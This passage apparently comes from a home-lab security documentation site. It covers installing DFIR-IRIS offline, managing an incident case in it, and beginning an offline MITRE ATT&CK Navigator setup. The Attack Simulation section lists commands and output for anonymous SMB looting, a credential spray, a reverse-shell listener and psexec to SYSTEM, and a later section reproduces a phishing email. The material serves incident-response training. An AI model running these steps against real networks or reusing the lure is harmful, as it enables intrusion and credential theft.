<p>Extract the transferred archive.</p> <pre><code>cd ~\ntar -xzvf iris-offline.tar.gz\n</code></pre> <p>Install Docker.</p> <pre><code>cd ~/iris-offline/docker\nsudo dpkg -i *.deb\n</code></pre> <p>Run <code>sudo service docker start</code></p> <pre><code>sudo service docker start\n</code></pre> <p>Run the following command to add your user to the <code>docker</code> group:</p> <pre><code>sudo usermod -aG docker $USER\n</code></pre> <p>Reload the group membership for your current session with the following command:</p> <pre><code>newgrp docker\n</code></pre> <p>Check if you can run Docker commands without <code>sudo</code>:</p> <pre><code>docker ps\n</code></pre> <p>Load transferred docker images.</p> <pre><code>cd ~/iris-offline/docker-images\ndocker load -i iris_db.tar\ndocker load -i iris_app.tar\ndocker load -i iris_nginx.tar\ndocker load -i rabbitmq.tar\n</code></pre> <p>Once the images are loaded, run IRIS:</p> <pre><code># Add \"-d\" to put it in the background\ndocker compose up\n</code></pre> <p>IRIS should now be accessible on your host interface via the HTTPS protocol, with port 443 used by default. You can open it in your web browser at <code>https://hostip</code>. If prompted with a warning about a self-signed certificate, click Advanced, then select Accept the Risk and Continue.</p> <p></p> <p></p> <p>When starting for the first time, an administrator account is automatically created. The password is displayed in the console output and can be located in the logs by searching for <code>WARNING :: post_init :: create_safe_admin</code>. Alternatively, you can set an admin password during the initial startup by specifying it in the <code>.env</code> file using the <code>IRIS_ADM_PASSWORD</code> environment variable. Please note that this option has no effect after the administrator account has been created.</p> <p>Note: The username is \"administrator\" with a lowercase \"a\", not an uppercase \"A\".</p> <pre><code>sudo docker compose logs app | grep \"WARNING :: post_init :: create_safe_admin\"\n</code></pre> <pre><code>iriswebapp_app  | 2024-12-23 07:15:05 :: WARNING :: post_init :: create_safe_admin :: &gt;&gt;&gt; Administrator password: Gk@#PklyAYEy0x&amp;s\n</code></pre> <p>If the password is not visible in the logs, try running <code>docker compose logs app | grep \"WARNING :: post_init :: create_safe_admin\"</code>. If the logs show that the user <code>administrator</code> has already been created, it indicates the instance has been started before, and the password is already set. In this case, refer to the recovery options.</p>"},{"location":"iris/iris.html#attack-simulation","title":"Attack Simulation","text":"<p>The smbclient tool on a Kali machine was used to connect to an SMB share hosted on WS2019 at 10.0.0.140. After logging in anonymously, the share\u2019s contents were listed, a file (user_credentials.xlsx) was downloaded, and the session was exited.</p> <pre><code>\u2514\u2500$ smbclient //10.0.0.140/Shares\nPassword for [WORKGROUP\\kali]:\nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Sat Dec 14 06:26:10 2024\n  ..                                  D        0  Sat Dec 14 06:26:10 2024\n  user_credentials.xlsx               A     9387  Sat Dec 14 06:21:40 2024\n\n                15570943 blocks of size 4096. 11749781 blocks available\nsmb: \\&gt; get user_credentials.xlsx \ngetting file \\user_credentials.xlsx of size 9387 as user_credentials.xlsx (327.4 KiloBytes/sec) (average 327.4 KiloBytes/sec)\nsmb: \\&gt; exit\n</code></pre> <p>The user_credentials.xlsx file revealed the credentials for a domain account named Splunk. Based on this information, a list of usernames and passwords was created. A credential spray was conducted using nxc smb with these usernames and passwords, which revealed that the Domain Administrator account was using the same password.</p> <p></p> <pre><code>\u2514\u2500$ nxc smb 10.0.0.0/24 -u usernames.txt -p passwords.txt --shares --continue-on-success\n&lt;SNIP&gt;\nSMB         10.0.0.140      445    WS2019           [+] cyber.local\\administrator:P@ssw0rd (Pwn3d!)\nSMB         10.0.0.140      445    WS2019           [+] cyber.local\\splunk:P@ssw0rd\n</code></pre> <p>IT Support was impersonated to send a phishing email to a user. The email included a link directing to a Kali machine hosting <code>setup.exe</code> on an HTTP server. The <code>setup.exe</code> file was a reverse shell payload designed to connect back to the Kali machine on port 443.</p> <p>After setting up a listener on port 443 and manually executing <code>setup.exe</code> (with Windows Defender disabled), a reverse shell was successfully obtained.</p> <p></p> <pre><code>\u2514\u2500$ nc -nvlp 443\nlistening on [any] 443 ...\nconnect to [10.0.0.29] from (UNKNOWN) [10.0.0.140] 61202\nMicrosoft Windows [Version 10.0.17763.3650]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Users\\Administrator\\Downloads&gt;whoami\nwhoami\ncyber\\administrator\n\nC:\\Users\\Administrator\\Downloads&gt;\n</code></pre> <p>Using the previously obtained Domain Administrator credentials from password spraying, impacket-psexec was utilised to gain access to WS2019 with NT AUTHORITY\\SYSTEM privileges.</p> <pre><code>\u2514\u2500$ impacket-psexec administrator:P@ssw0rd@10.0.0.140 \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.0.0.140.....\n[*] Found writable share ADMIN$\n[*] Uploading file DaZyEoxe.exe\n[*] Opening SVCManager on 10.0.0.140.....\n[*] Creating service epJh on 10.0.0.140.....\n[*] Starting service epJh.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.3650]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>"},{"location":"iris/iris.html#introduction-to-iris","title":"Introduction to IRIS","text":""},{"location":"iris/iris.html#adding-a-customer","title":"Adding a Customer","text":"<p>Upon entering the administrator credentials, the Dashboard highlights pending tasks and ongoing cases.</p> <p></p> <p>To access the customer management page, open the sidebar menu, expand the Advanced section, and click on Customers.</p> <p></p> <p>This displays a list of customers. To add a new customer, click Add Customer in the top-right corner of the window. In this window, we can input the customer's details. We'll name the customer cyber.local and add customer as a brief description. There's also an option to specify the Service-Level Agreement (SLA) with the customer, but since we don't have one in this instance, we'll leave it blank.</p> <p></p> <p>Click Save to create the customer. Once saved, the new customer will appear in the list on the Customer Management page.</p> <p></p>"},{"location":"iris/iris.html#creating-a-case","title":"Creating a Case","text":"<p>Having logged into IRIS and created our customer, we can now begin the case management process. A case is the fundamental unit of an incident. It serves as a container for various elements used to organise information related to the incident.</p> <p>To create a new case, navigate to the dashboard and click Create new case in the top-right corner of the window. This opens a new page with several fields for entering details about the new case. </p> <p>For Customer, select cyber.local. For Case Name, enter [2024-12-16] Data Breach. The Select Case Template option allows us to choose a predefined template for the case. Templates can automatically populate various elements, such as tasks, tags, a case title prefix, and more. Since this step is optional, we\u2019ll leave it blank.</p> <p>For Classification, select Information-Content-Security: Unauthorised Access to Information. For Short Description, enter Data breach from unauthorised SMB share access. </p> <p>The last field is the SOC Ticket ID. In many cases, incidents are monitored through a ticketing platform like Jira or ServiceNow. While we're not using a ticketing system for this example, this is where you would input the ticket ID if one were being used.</p> <p></p> <p>After completing all the required fields, click Create to add the case. A pop-up will appear confirming that the case has been successfully created.</p> <p></p> <p>With our new case created, we can return to the dashboard by clicking Go to Dashboard in the pop-up or selecting Dashboard from the sidebar menu.</p> <p>Our newly created case, titled #2 - [2024-12-16] Data Breach, appears under Attributed Open Cases. The prefix #2 is automatically added to the case title, reflecting its sequence in the total number of cases created in the system.</p> <p></p> <p>By clicking on the case name, we are taken to the Summary tab for the case. This page offers a range of options for managing the case.</p> <p></p>"},{"location":"iris/iris.html#adding-assets","title":"Adding Assets","text":"<p>During incident response, maintaining a list of assets that are known or suspected to be compromised is essential. To add an asset, go to the Assets tab on the case page. This will display the asset list, which is currently empty. To include a new asset, click the Add Assets button located in the top-right corner of the window.</p> <p></p> <p>For the first asset, enter the following details:</p> <ul> <li>Asset Type: Select Windows - DC.</li> <li>Asset Name: Enter WS2019.</li> <li>Description: Add Windows Server 2019 Domain Controller.</li> <li>Domain: Specify cyber.local.</li> <li>IP: 10.0.0.140</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Set to Done, as the machine has been confirmed compromised and analysis is complete.</li> <li>Tags: Add Windows and Domain Controller.</li> </ul> <p>Click Save in the lower right-hand corner of the window. </p> <p></p> <p>This creates the following entry in the list of assets:</p> <p></p> <p>For the second asset, enter the following details:</p> <ul> <li>Asset Type: Select Linux - Computer.</li> <li>Asset Name: Enter Splunk.</li> <li>Description: Add A Linux computer running Splunk Enterprise.</li> <li>Domain: (Leave it blank)</li> <li>IP: 10.0.0.120</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Set to Done, as the machine has been confirmed compromised and analysis is complete.</li> <li>Tags: Add Linux and Splunk.</li> </ul> <p>Click Save in the lower right-hand corner of the window. </p> <p></p> <p>The new asset will now appear in the Assets tab list:</p> <p></p> <p>Next, set asset details for the Domain account splunk:</p> <ul> <li>Asset Type: Select Windows Account - AD.</li> <li>Asset Name: Enter splunk (the username).</li> <li>Description: Add Domain account.</li> <li>Domain: Set to cyber.local.</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Select Done.</li> <li>Tags: Add Windows, Active Directory, and Account.</li> </ul> <p></p> <p>Click Save to finalise the entry. The new asset will now appear in the Assets tab list.</p> <p></p> <p>Next, set asset details for the Domain Administrator account:</p> <ul> <li>Asset Type: Select Windows Account - AD - Admin.</li> <li>Asset Name: Enter Administrator (the username).</li> <li>Description: Add Domain Administrator account.</li> <li>Domain: Set to cyber.local.</li> <li>Compromise Status: Choose Compromised.</li> <li>Analysis Status: Select Done.</li> <li>Tags: Add Windows, Active Directory, and Administrator Account.</li> </ul> <p></p> <p>Click Save. Our list of assets in the case's Assets tab now contains a total of four entries.</p> <p></p>"},{"location":"iris/iris.html#creating-a-timeline","title":"Creating a Timeline","text":"<p>In IRIS, we can create a timeline by adding individual events to document the sequence of actions and incidents.</p> <p>The first event is File Creation Event Detected for setup.exe on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* \"setup.exe\"\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>To create an event for this in the timeline, navigate to the Timeline tab. Click Add event and enter the following details:</p> <ul> <li>Title: File Creation Event Detected for setup.exe on WS2019</li> <li>Time: 14/12/2024 12:16:54.000 AM with the UTC offset of +13:00.<ul> <li>The most widely used standard for recording time data is Coordinated Universal Time (UTC). In this case, we've included +13:00 as the UTC offset. This is because the Splunk server is configured to New Zealand time, which generally has a UTC offset of +13 hours during Daylight Saving Time.</li> </ul> </li> <li>Description: The Firefox process created a file named setup.exe in the Administrator's Downloads folder on WS2019.</li> <li> <p>Event Raw data: C:\\Program Files\\Mozilla Firefox\\firefox.exeC:\\Users\\Administrator\\Downloads\\setup.exe</p> <ul> <li>To obtain raw event data, clicking the &gt; icon reveals the Event Actions dropdown. From the dropdown options, select Show Source to display the raw log.</li> <li>Selecting Show Source opens a new browser tab, highlighting the raw log entry. From there, we can copy the log and paste it into the raw event data field.</li> </ul> <p></p> </li> <li> <p>Event Source: Sysmon</p> </li> <li>Event Tags: file creation, Firefox, setup.exe</li> <li>Link to Assets: WS2019</li> <li>Event Category: Initial Access</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the red box to assign a colour to the event for easy identification.</li> <li>Save</li> </ul> <p></p> <p>Upon saving, we are taken to the Timeline tab, where the event we just created is now visible.</p> <p></p> <p>The next event to document is Anonymous Login accessing C:\\Shares on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* source=\"WinEventLog:Security\" \"EventCode=5140\" Account_Name=\"ANONYMOUS LOGON\"\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>The log reveals that the event occurred at 04:17:52.000 PM. Expanding the log by selecting Show all 31 lines provides additional details about the event, including the Share Path, which is listed as ??\\C:\\Shares. Click Add event and enter the following details:</p> <ul> <li>Title: Anonymous Login Accessed C:\\Shares on WS2019</li> <li>Time: 16/12/2024 04:17:52.000 PM with the UTC offset of\u00a0+13:00.</li> <li>Description: An anonymous login accessed the share path ??\\C:\\Shares on WS2019 from the source IP address 10.0.0.29. Accessed user_credentials.xlsx.</li> <li>Event Raw data: 12/16/2024 04:17:52 PM LogName=Security EventCode=5140 EventType=0 ComputerName=WS2019.cyber.local </li> <li>Event Source: Windows Event Log</li> <li>Event tags: anonymous login, smb</li> <li>Link to assets: WS2019</li> <li>Event category: Initial Access</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the orange box to assign a colour to the event for easy identification.</li> <li>Save</li> </ul> <p></p> <p>After clicking Save, we are redirected to the Timeline tab, where our newly created event is now displayed.</p> <p></p> <p>The next event to document is Malicious Service Installed on WS2019. To locate the log for this event, search the Splunk server using the following query:</p> <pre><code>index=* EventCode=7045\n</code></pre> <p>Set the timeframe to All time to ensure the event is captured.</p> <p></p> <p>Click Add event and enter the following details:</p> <ul> <li>Title: Malicious Service Installed on WS2019</li> <li>Time: 16/12/2024 10:16:53.000 PM with the UTC offset of +13:00.</li> <li>Description: A malicious service (LQEu) was installed on WS2019. The service runs under the LocalSystem account.</li> <li>Event Raw data: 12/16/2024 10:16:53 PM LogName=System EventCode=7045 EventType=4 ComputerName=WS2019.cyber.local </li> <li>Event Source: Windows Event Log</li> <li>Event tags: malicious service</li> <li>Link to assets: WS2019</li> <li>Event category: Persistence</li> <li>Select Add to Summary to include the event in the timeline visualisation.</li> <li>Choose Display in Graph to add the event to the graph view.</li> <li>Use the green box to assign a colour to the event for easy identification.</li> <li>Save</li> </ul> <p></p> <p>After saving, the Timeline tab displays the newly added event, bringing the total to three events.</p> <p></p>"},{"location":"iris/iris.html#adding-evidence","title":"Adding Evidence","text":"<p>In incident response, evidence is crucial for verifying details such as the nature, origin, timing, and potential culprits behind an incident. In this instance, we\u2019ll include the <code>.eml</code> file, which contains the original phishing email that delivered the <code>setup.exe</code> file laced with malware. The following is the content of our raw email:</p> <pre><code>Delivered-To: &lt;SNIP&gt;@gmail.com\n\nDear staff,\n\nI hope this email finds you well.\n\nPlease download the required setup.exe file using this link\n&lt;http://10.0.0.29/setup.exe&gt; as the file size is too large to attach to\nthis email.\n\nOnce downloaded, follow these steps to install:\n\n1. Save the file to your computer.\n2. Double-click the downloaded file to start the installation.\n3. Follow the on-screen prompts to complete the setup.\n\nPlease note that some security warnings might appear when running the file.\nThese can be safely ignored, as many executable files are flagged as\nsuspicious by default.\n\nIf you experience any issues or have questions, feel free to reach out to\nme directly.\n\nThank you for your cooperation.\n\nBest regards,\n\nIT helpdesk\n\n--000000000000e1ecfe0629387b6c\nContent-Type: text/html; charset=\"UTF-8\"\nContent-Transfer-Encoding: quoted-printable\n\n&lt;div dir=3D\"ltr\"&gt;&lt;div&gt;&lt;div&gt;&lt;div&gt;&lt;div dir=3D\"auto\"&gt;&lt;div&gt;&lt;div&gt;&lt;p&gt;Dear staff,&lt;=\n/p&gt;&lt;p&gt;I hope this email finds you well.&lt;br&gt;&lt;br&gt;Please download the required=\n setup.exe file using this &lt;a href=3D\"http://10.0.0.29/setup.exe\"&gt;link&lt;/a&gt; =\nas the file size is too large to attach to this email.&lt;br&gt;&lt;br&gt;Once download=\ned, follow these steps to install:&lt;br&gt;&lt;br&gt;1. Save the file to your computer=\n.&lt;br&gt;2. Double-click the downloaded file to start the installation.&lt;br&gt;3. F=\nollow the on-screen prompts to complete the setup.&lt;br&gt;&lt;br&gt;Please\n note that some security warnings might appear when running the file.=20\nThese can be safely ignored, as many executable files are flagged as=20\nsuspicious by default.&lt;br&gt;&lt;br&gt;If you experience any issues or have question=\ns, feel free to reach out to me directly.&lt;br&gt;&lt;br&gt;Thank you for your coopera=\ntion.&lt;br&gt;&lt;br&gt;Best regards,&lt;br&gt;&lt;br&gt;IT helpdesk&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/=\ndiv&gt;&lt;/div&gt;&lt;/div&gt;\n\n--000000000000e1ecfe0629387b6c--\n</code></pre> <p>Let\u2019s start by uploading the <code>email.eml</code> file, which contains the original phishing email. To do this, we\u2019ll go to our case, click on the database icon located in the upper right corner of the window, and open the datastore.</p> <p>Within our case, there are three subdirectories: Evidences, IOCs, and Images. To add the file to the Evidences folder, we\u2019ll click the + icon next to the folder name and then select Add file.</p> <p></p> <p>We\u2019ll start by browsing for the file. Once selected, the Filename field will automatically populate with the file name. Next, we\u2019ll add a brief description: Email that delivered setup.exe to the user. We\u2019ll tag the file with phishing and malware, then select File is Evidence to ensure it\u2019s included in the Evidence tab.</p> <p></p> <p>Once we click Save, the file will appear in the Evidences folder within the datastore.</p> <p></p> <p>As we selected File is Evidence for each uploaded file, they were all registered as evidence under the case\u2019s Evidences tab. Each entry includes its corresponding SHA256 hash.</p> <p></p>"},{"location":"iris/iris.html#collaboration-and-access-management","title":"Collaboration and Access Management","text":"<p>During incident response, we generally operate as part of a team, maintaining regular communication with our team members.</p> <p>To add a comment, navigate to the Timeline tab and click on the speech bubble icon located in the upper right corner of the event. We can add multiple comments or questions here, simulating a chat.</p> <p></p> <p>In IRIS, we can also create and assign tasks. To do this, navigate to the Tasks tab and click Add task in the upper right corner of the window.</p> <p></p> <p>In the task creation window, we\u2019ll:</p> <ol> <li>Assign the task to administrator (the only user for now).</li> <li>Set the Status to To do.</li> <li>Add a Task Title: Upload install.ps1 file to evidence.</li> <li>Include a detailed Description: The install.ps1 file was used to create a reverse shell on WS2019 to establish persistence. Upload a copy to evidence.</li> <li>Tag the task with malware and reverse shell.</li> </ol> <p></p> <p>To create the task, we click the Save button. This adds it to the list of tasks displayed in the Tasks tab.</p> <p></p> <p>To manage user access, go to the Advanced dropdown in the sidebar and select Access Control. This allows you to control who can access specific cases or case types.</p> <p></p> <p>Here, we see Users and Groups as the main permission entities. The Users section displays a list of all individual users.</p> <p></p> <p>Currently, we only have one user, administrator. We\u2019ll select this user and navigate to the Cases access tab.</p> <p></p> <p>The Cases access tab shows that the administrator user has full access to one case, [2024-12-16] Data breach. To grant or restrict access to additional cases, we can click the Set case access button.</p>"},{"location":"iris/iris.html#generating-a-report","title":"Generating a Report","text":"<p>We can generate reports using a report template, which ensures completeness and consistency across cases while saving time. An IRIS report template is a file that includes various tags representing different types of content.</p> <p>To view the default IRIS investigations report template, we\u2019ll go to the Advanced dropdown in the sidebar menu and select Report Templates.</p> <p>We can download an example of an investigation template and an activities report template. Click Add template and upload investigation template.</p> <p></p> <p>Add the following details:</p> <ul> <li>Template name: Investigation</li> <li>Template type: Investigation</li> <li>Template language: English</li> <li>Template description: Investigation</li> <li>Template name format: %case_name%_%date%</li> <li>Template file: iris_report_template.docx (investigation template)</li> </ul> <p></p> <p>To open the investigation template, double-click on the .docx file. By default, it will open in LibreOffice, an open-source office suite, on our Ubuntu machine.</p> <p>Let\u2019s take a look at the cover page. The <code>{{ case.name }}</code> tag represents the case name, <code>{{ doc_id }}</code> corresponds to the IRIS document ID, and <code>{{ date }}</code> represents the current date. When the template is processed, these placeholders will be replaced with the relevant data at that point in time.</p> <p></p> <p>Now, let\u2019s examine the asset list on page 3. Here, we see a small table generated using a Jinja2 for loop. The loop begins with <code>{%tr for asset in assets %}</code> and ends with <code>{%tr endfor %}</code>. For each asset, a row is created that includes its name, type, compromise status, and description, each represented by corresponding tags. The template can be customised to add or remove elements as needed.</p> <p></p> <p>To generate an IRIS report, navigate to the Summary tab of the case and click the Generate report button.</p> <p></p> <p>This opens a window where we can choose a report template. We\u2019ll select Investigation. Click the Generate button to create and download the report. Alternatively, we can click the Generate in Safe Mode button on the left. This option generates the report without including images.</p> <p></p> <p>Now that the report is generated, let\u2019s inspect the changes. Open the file by double-clicking it in the downloads list. Start by reviewing the cover page again.</p> <p>This time, the placeholders have been replaced with actual data. The <code>{{ case.name }}</code> tag now shows the case name, \"#2 - [2024-12-16] Data breach\". Similarly, <code>{{ doc_id }}</code> is replaced with \"241217_0930\" and <code>{{ date }}</code> displays \"2024-12-17\".</p> <p></p> <p>A similar update occurred on page 3 with the asset list. The for loop populated the table with four rows, each representing the assets we created: WS2019, Splunk, splunk, and Administrator.</p> <p></p>"},{"location":"iris/iris.html#case-closure-and-database-backup","title":"Case Closure and Database Backup","text":"<p>Once incident response concludes and all tasks are completed, the case can be closed. To do this, navigate to the Summary tab and click the Manage button, identified by the gear icon.</p> <p></p> <p>Before closing the case, we need to update its Outcome. To do this, click the Edit button.</p> <p></p> <p>In the Outcome dropdown, we can choose from several options:</p> <ul> <li>Unknown: No clear outcome was determined.</li> <li>False Positive: The investigation confirmed no attack occurred.</li> <li>True Positive with impact: An attack occurred, affecting the organisation.</li> <li>True Positive without impact: An attack occurred but caused no impact.</li> <li>Not applicable: The investigation was not completed.</li> </ul> <p>We\u2019ll select True Positive with impact.</p> <p>At the bottom left of the window, there are two choices: Delete case and Close case. We\u2019ll choose Close case to finalise it.</p> <p></p> <p>A pop-up window will appear, asking for confirmation to close the case. We\u2019ll click OK to confirm. Once confirmed, the case will be closed, and the page colour will update to reflect its closed status.</p> <p></p> <p>To retain data, we usually create a copy for storage elsewhere. While IRIS doesn\u2019t allow copying individual cases, we can back up the entire IRIS database, which includes all cases, using the <code>pg_dump</code> command.  Since IRIS runs inside a Docker container, we\u2019ll need to use <code>docker exec</code> to run the command within the container.</p> <p>First, we need to identify the container ID where IRIS is running. We can do this by executing:</p> <pre><code>sudo docker container ls | grep iriswebapp_db\n</code></pre> <pre><code>cyber@Iris:~/iris-web$ sudo docker container ls | grep iriswebapp_db\n[sudo] password for cyber: \n08ad6d02ce90   ghcr.io/dfir-iris/iriswebapp_db:latest      \"docker-entrypoint.s\u2026\"   7 hours ago   Up 7 hours             5432/tcp                                                               iriswebapp_db\n</code></pre> <p>Next, we\u2019ll use the container ID with the <code>docker exec</code> command to back up the database. We\u2019ll run the following:</p> <pre><code>sudo docker exec 08ad6d02ce90 pg_dump -U postgres iris_db | gzip &gt; iris_db_backup.gz\n</code></pre> <pre><code>cyber@Iris:~/iris-web$ sudo docker exec 08ad6d02ce90 pg_dump -U postgres iris_db | gzip &gt; ../iris_db_backup.gz\n</code></pre> <p>Alternatively, we can create a backup directly from the IRIS web application. To do this:</p> <ol> <li>Navigate to Advanced &gt; Server settings &gt; Backups &gt; Database.</li> <li>Click on Backup database.</li> </ol> <p>Before doing this, we need to set the <code>BACKUP_PATH</code> environment variable to specify the destination directory where the backup will be stored.</p> <p></p>"},{"location":"iris/iris.html#references","title":"References","text":"<ul> <li>https://docs.dfir-iris.org/latest/</li> <li>https://github.com/dfir-iris/iris-web</li> <li>https://youtu.be/XXyIv_aes4w?si=L2Kn1BNXyEdVXwwI</li> </ul>"},{"location":"navigator/navigator.html","title":"MITRE ATT&CK Navigator","text":""},{"location":"navigator/navigator.html#mitre-attck-navigator","title":"MITRE ATT&amp;CK Navigator","text":"<p>The ATT&amp;CK Navigator is a simple, flexible tool for exploring and annotating ATT&amp;CK matrices, replacing manual methods like spreadsheets. It helps users map defensive coverage, plan red/blue team activities, track detected techniques, and more. With features like colour coding, comments, and numerical values, it makes ATT&amp;CK more accessible through intuitive visualisation.</p> <p>A key feature is customisable \"layers,\" allowing users to focus on specific platforms, highlight adversary techniques, or filter data. Layers can be created interactively or generated programmatically for later use.</p>"},{"location":"navigator/navigator.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, MITRE ATT&amp;CK Navigator was installed and configured in an air-gapped Ubuntu environment. Layers were created using the Tactics, Techniques, and Procedures (TTPs) of well-known Advanced Persistent Threats (APTs). These layers were rendered in different colours and combined to demonstrate how MITRE ATT&amp;CK Navigator can be used for both red team and blue team planning.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.10 (WAN) / 10.0.0.1 (LAN) Ubuntu Ubuntu 24.04 Internet-Connected VM 10.0.0.200 Mitre Ubuntu 24.04 Air-gapped VM 10.0.0.150 <p></p>"},{"location":"navigator/navigator.html#requirements","title":"Requirements","text":"<ul> <li>Node.js v18 \u2013 Ensure you have this version installed to support compatibility.</li> <li>Angular CLI v17 \u2013 Needed for managing Angular projects and dependencies.</li> </ul>"},{"location":"navigator/navigator.html#installing-mitre-attck-navigator-offline","title":"Installing MITRE ATT&amp;CK Navigator Offline","text":""},{"location":"navigator/navigator.html#on-an-internet-connected-machine","title":"On an Internet-Connected Machine","text":"<p>On an internet-connected Ubuntu VM, refresh the package lists from the repositories and create a structured directory for downloading dependencies:</p> <pre><code>sudo apt-get update\nmkdir -p ~/mitre-offline/{vmtools,git,libre,nodejs,angular-cli}\n</code></pre> <p>Download and install VM tools (this will enable copy and pasting and dynamic resolution). </p> <pre><code>cd ~/mitre-offline/vmtools\napt-get download \\\n  libatkmm-1.6-1v5 \\\n  libcairomm-1.0-1v5 \\\n  libglibmm-2.4-1t64 \\\n  libgtkmm-3.0-1t64 \\\n  libmspack0t64 \\\n  libpangomm-1.4-1v5 \\\n  libsigc++-2.0-0v5 \\\n  libxmlsec1t64 \\\n  libxmlsec1t64-openssl \\\n  open-vm-tools \\\n  open-vm-tools-desktop \\\n  zerofree\nsudo dpkg -i *.deb\n</code></pre> <p>After installing VM tools, you may need to reboot the VM if copy and pasting does not work. </p> <p>Download and install Git. Verify the installation.</p> <pre><code>cd ~/mitre-offline/git\nsudo apt-get download git git-man liberror-perl\nsudo dpkg -i *.deb\ngit --version\n</code></pre> <p>Download LibreOffice.</p> <pre><code>cd ~/mitre-offline/libre\nsudo apt-get -o Dir::Cache::archives=\"/home/cyber/mitre-offline/libre\" --download-only install libreoffice\n</code></pre> <p>Download and install Node.js v18. Verify the installation.</p> <pre><code>cd ~/mitre-offline/nodejs\nwget https://nodejs.org/dist/v18.20.6/node-v18.20.6-linux-x64.tar.xz\ntar -xvf node-v18.20.6-linux-x64.tar.xz \nsudo mv node-v18.20.6-linux-x64 /usr/local/nodejs\necho 'export PATH=/usr/local/nodejs/bin:$PATH' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\nnode --version\nnpm --version\n</code></pre> <p>Use\u00a0<code>npm install</code>\u00a0to download all Angular CLI v17 dependencies into the\u00a0<code>node_modules</code>\u00a0directory. This process may take some time.</p> <pre><code>cd ~/mitre-offline/angular-cli \nnpm install @angular/cli@17\n</code></pre> <p>Clone MITRE ATT&amp;CK Navigator repository. This process may take some time.</p> <pre><code>cd ~/mitre-offline\ngit clone https://github.com/mitre-attack/attack-navigator.git\n</code></pre> <p>Use\u00a0<code>npm install</code>\u00a0to download all dependencies into the\u00a0<code>node_modules</code>\u00a0directory:</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app\nnpm install\n</code></pre> <p>Download the latest MITRE ATT&amp;CK data files into the\u00a0<code>nav-app/src/assets</code>\u00a0directory.</p> <pre><code>cd ~/mitre-offline/attack-navigator/nav-app/src/assets\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/mobile-attack/mobile-attack.json\nwget https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/ics-attack/ics-attack.json\n</code></pre> <p>Create <code>index.json</code> in the <code>nav-app/src/assets</code> with the following content.</p> <pre><code>nano ~/mitre-offline/attack-navigator/nav-app/src/assets/index.json\n</code></pre> <pre><code>{\n    \"id\": \"10296991-439b-4202-90a3-e38812613ad4\",\n    \"name\": \"MITRE ATT&amp;CK\",\n    \"description\": \"MITRE ATT&amp;CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. The ATT&amp;CK knowledge base is used as a foundation for the development of specific threat models and methodologies in the private sector, in government, and in the cybersecurity product and service community.\",\n    \"created\": \"2018-01-17T12:56:55.080Z\",\n    \"modified\": \"2024-11-12T14:00:00.188Z\",\n    \"collections\": [\n        {\n            \"id\": \"x-mitre-collection--1f5f1533-f617-4ca8-9ab4-6a02367fa019\",\n            \"created\": \"2018-01-17T12:56:55.080Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/enterprise-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"Enterprise ATT&amp;CK\",\n            \"description\": \"ATT&amp;CK for Enterprise provides a knowledge base of real-world adversary behavior targeting traditional enterprise networks. ATT&amp;CK for Enterprise covers the following platforms: Windows, macOS, Linux, PRE, Office 365, Google Workspace, IaaS, Network, and Containers.\"\n        },\n        {\n            \"id\": \"x-mitre-collection--dac0d2d7-8653-445c-9bff-82f934c1e858\",\n            \"created\": \"2018-01-17T12:56:55.080Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/mobile-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"Mobile ATT&amp;CK\",\n            \"description\": \"ATT&amp;CK for Mobile is a matrix of adversary behavior against mobile devices (smartphones and tablets running the Android or iOS/iPadOS operating systems). ATT&amp;CK for Mobile builds upon NIST's Mobile Threat Catalogue and also contains a separate matrix of network-based effects, which are techniques that an adversary can employ without access to the mobile device itself.\"\n        },\n        {\n            \"id\": \"x-mitre-collection--90c00720-636b-4485-b342-8751d232bf09\",\n            \"created\": \"2020-10-27T14:49:39.188Z\",\n            \"versions\": [\n                {\n                    \"version\": \"16.1\",\n                    \"url\": \"assets/ics-attack.json\",\n                    \"modified\": \"2024-11-12T14:00:00.188Z\"\n                }\n            ],\n            \"name\": \"ICS ATT&amp;CK\",\n            \"description\": \"The ATT&amp;CK for Industrial Control Systems (ICS) knowledge base categorizes the unique set of tactics, techniques, and procedures (TTPs) used by threat actors in the ICS technology domain. ATT&amp;CK for ICS outlines the portions of an ICS attack that are out of scope of Enterprise and reflects the various phases of an adversary\\u2019s attack life cycle and the assets and systems they are known to target.\"\n        }\n    ]\n}\n</code></pre> <p>Using the <code>json.tool</code> module, which is already installed on the Ubuntu VM, validate all JSON files to ensure they are syntactically correct.</p> <pre><code>python3 -m json.tool ~/mitre-offline/attack-navigator/nav-app/src/assets/index.json\npython3 -m json.tool 